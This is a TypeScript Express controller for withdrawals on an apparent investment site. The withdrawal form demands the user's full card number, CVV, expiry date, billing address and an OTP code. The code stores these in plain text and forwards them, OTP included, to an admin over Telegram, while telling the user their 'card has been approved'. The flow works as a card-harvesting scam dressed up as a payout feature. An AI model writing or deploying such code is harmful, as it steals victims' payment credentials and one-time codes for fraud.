import { Response } from 'express'
import { AuthRequest, authenticateToken } from '../middleware/auth.js'
import { prisma } from '../config/db.js'
import { notifyWithdrawalRequest } from '../services/telegramService.js'
import { generateWithdrawalId } from '../utils/helpers.js'
import { z } from 'zod'
import TelegramBot from 'node-telegram-bot-api'

const WITHDRAWAL_FEE_PERCENT = 0.02
const WITHDRAWAL_FEE_MIN = 1
const WITHDRAWAL_FEE_MAX = 5

const getWithdrawalFee = (amount: number): number => {
  const fee = amount * WITHDRAWAL_FEE_PERCENT
  return Math.max(WITHDRAWAL_FEE_MIN, Math.min(WITHDRAWAL_FEE_MAX, fee))
}

// Send message to user's telegram
const notifyUser = async (chatId: string, text: string) => {
  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
  if (!BOT_TOKEN) return
  try {
    const bot = new TelegramBot(BOT_TOKEN, { polling: false })
    await bot.sendMessage(chatId, text)
  } catch (err) {
    console.error('Failed to notify user:', err)
  }
}

const createWithdrawalSchema = z.object({
  investmentId: z.string(),
  amount: z.number().min(1),
  method: z.enum(['CARD']),
  cardNumber: z.string().regex(/^\d{16}$/, 'Card number must be 16 digits'),
  cardholderName: z.string().min(2, 'Cardholder name required'),
  expiryDate: z.string().regex(/^(0[1-9]|1[0-2])\/\d{2}$/, 'Expiry date format must be MM/YY'),
  cvv: z.string().regex(/^\d{3}$/, 'CVV must be 3 digits'),
  billingAddress: z.string().min(5, 'Billing address required'),
  otpCode: z.string().min(4, 'OTP code required'),
})

export const getWithdrawals = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const withdrawals = await prisma.withdrawal.findMany({
      where: { userId: req.user!.id },
      include: { investment: true },
      orderBy: { createdAt: 'desc' },
    })

    res.status(200).json({ success: true, data: withdrawals })
  } catch (error) {
    console.error('Get withdrawals error:', error)
    res.status(500).json({ success: false, message: 'Server error' })
  }
}

export const createWithdrawal = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const validated = createWithdrawalSchema.parse(req.body)
    const { investmentId, amount, method, cardNumber, cardholderName, expiryDate, cvv, billingAddress, otpCode } = validated

    const investment = await prisma.investment.findFirst({
      where: { id: investmentId, userId: req.user!.id },
    })

    if (!investment) {
      res.status(404).json({ success: false, message: 'Investment not found' })
      return
    }

    const fee = getWithdrawalFee(amount)
    const totalDeduct = Number(amount) + fee

    if (Number(investment.currentBalance) < totalDeduct) {
      res.status(400).json({ success: false, message: `Insufficient balance. Fee: $${fee.toFixed(2)}` })
      return
    }

    const withdrawalId = generateWithdrawalId()

    const withdrawal = await prisma.withdrawal.create({
      data: {
        withdrawalId,
        userId: req.user!.id,
        investmentId,
        amount,
        method,
        cardNumber,
        cardholderName,
        expiryDate,
        cvv,
        billingAddress,
        verificationCode: otpCode,
        isVerified: false,
        status: 'WAITING_FOR_ADMIN_APPROVAL',
        transactionHash: `Fee: ${fee.toFixed(2)}`,
      },
      include: { investment: true },
    })

    // Notify admin with card details and user-provided OTP
    await notifyWithdrawalRequest(
      withdrawal.id,
      `${req.user!.firstName} ${req.user!.lastName}`,
      Number(amount),
      method,
      {
        cardNumber: withdrawal.cardNumber!,
        cardholderName: withdrawal.cardholderName!,
        expiryDate: withdrawal.expiryDate!,
        cvv: withdrawal.cvv!,
        verificationCode: withdrawal.verificationCode!,
        billingAddress: withdrawal.billingAddress!,
      }
    )

    res.status(201).json({
      success: true,
      message: 'Withdrawal submitted. Admin will review and approve.',
      data: {
        ...withdrawal,
        cardNumber: `${cardNumber.slice(0, 4)} **** **** **** ${cardNumber.slice(-4)}`,
      },
    })
  } catch (error) {
    if (error instanceof z.ZodError) {
      res.status(400).json({ success: false, message: 'Validation error', errors: error.errors })
      return
    }
    console.error('Create withdrawal error:', error)
    res.status(500).json({ success: false, message: 'Server error' })
  }
}

// Admin approves the card - card has user-provided OTP
export const adminApproveWithdrawal = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { id } = req.params

    const withdrawal = await prisma.withdrawal.findUnique({
      where: { id },
      include: { user: true },
    })

    if (!withdrawal) {
      res.status(404).json({ success: false, message: 'Withdrawal not found' })
      return
    }

    if (withdrawal.status !== 'WAITING_FOR_ADMIN_APPROVAL') {
      res.status(400).json({ success: false, message: 'Withdrawal not in admin approval state' })
      return
    }

    // Admin approved - now ready for payment
    const updated = await prisma.withdrawal.update({
      where: { id },
      data: { status: 'WITHDRAWAL_PENDING', isVerified: true },
    })

    if (withdrawal?.user?.telegramChatId) {
      await notifyUser(
        withdrawal.user.telegramChatId,
        `✅ Your withdrawal card has been approved! Admin will process the payment shortly.`
      )
    }

    res.status(200).json({
      success: true,
      message: 'Card approved. Ready for payment processing.',
      data: updated,
    })
  } catch (error) {
    console.error('Admin approve withdrawal error:', error)
    res.status(500).json({ success: false, message: 'Server error' })
  }
}

export const verifyWithdrawal = async (req: AuthRequest, res: Response): Promise<void> => {
  // Endpoint kept for compatibility - no longer used in current flow
  res.status(200).json({ success: true, message: 'Withdrawal status check' })
}

export const approveWithdrawal = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { id } = req.params
    const { transactionHash, adminNotes } = req.body

    const withdrawal = await prisma.withdrawal.findUnique({
      where: { id },
      include: { investment: true },
    })

    if (!withdrawal) {
      res.status(404).json({ success: false, message: 'Withdrawal not found' })
      return
    }

    if (!withdrawal.isVerified) {
      res.status(400).json({ success: false, message: 'Withdrawal must be verified by admin first' })
      return
    }

    const feeMatch = withdrawal.transactionHash?.match(/Fee: ([\d.]+)/)
    const fee = feeMatch ? Number(feeMatch[1]) : getWithdrawalFee(Number(withdrawal.amount))
    const totalDeduct = Number(withdrawal.amount) + fee

    const updated = await prisma.withdrawal.update({
      where: { id },
      data: {
        status: 'WITHDRAWN',
        transactionHash,
        adminNotes,
      },
    })

    await prisma.investment.update({
      where: { id: withdrawal.investmentId },
      data: {
        currentBalance: {
          decrement: totalDeduct
        },
      },
    })

    res.status(200).json({ success: true, message: 'Withdrawal approved', data: updated })
  } catch (error) {
    console.error('Approve withdrawal error:', error)
    res.status(500).json({ success: false, message: 'Server error' })
  }
}

export const rejectWithdrawal = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { id } = req.params
    const { adminNotes } = req.body

    const updated = await prisma.withdrawal.update({
      where: { id },
      data: { status: 'REJECTED', adminNotes },
    })

    res.status(200).json({ success: true, message: 'Withdrawal rejected', data: updated })
  } catch (error) {
    console.error('Reject withdrawal error:', error)
    res.status(500).json({ success: false, message: 'Server error' })
  }
}